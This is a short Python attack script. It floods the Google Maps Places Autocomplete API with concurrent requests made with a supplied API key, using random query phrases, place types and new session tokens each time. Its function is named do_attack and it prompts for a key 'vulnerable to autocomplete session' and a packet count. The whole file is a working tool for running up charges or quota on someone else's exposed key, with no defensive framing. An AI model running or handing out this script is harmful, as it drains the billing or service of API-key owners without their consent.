#!/usr/bin/python3
import grequests, warnings, json, sys, os, random, colorama, uuid
from string import ascii_lowercase
from colorama import Fore
colorama.init(autoreset=True)

def exception_handler(request, exception):
    print(Fore.RED + "Request Failed")

def get_type():
    type = open("datasets/gmap_types.txt","r")
    type_line = next(type)

    for i, t_line in enumerate(type,2):
        if random.randrange(i):
            continue
        type_line = t_line

    return type_line

def generate_url(apikey, type):
   phrase = "".join(random.choices(ascii_lowercase, k=3))
   session_token = str(uuid.uuid4())
   return f"https://maps.googleapis.com/maps/api/place/autocomplete/json?input={phrase}&types={type}&sessiontoken={session_token}&key={apikey}"

def do_attack():
    apikey = str(input("Enter Google Maps API Key that vulnerable to autocomplete session: "))
    count = int(input("Enter packet count: "))
    print (Fore.GREEN + "[+] Sending Packets")
    urls = list()
    for i in range(count):
        url = generate_url(apikey, get_type())
        urls.append(url)

    responses = (grequests.get(u, timeout=5) for u in urls)
    result_map = grequests.imap(responses, exception_handler=exception_handler, size=100)
    for result in result_map:
        if result is not None:
            if result.text.find("error_message") < 0:
                print(Fore.GREEN + f"[+] Packet Succeed: No Error Message")
            else:
                print(Fore.RED + f"[-] Packet Failed: Error Message Exist")
        else:
            print("[-] Packet Failed: Request Failed")

if __name__ == "__main__":
    do_attack()

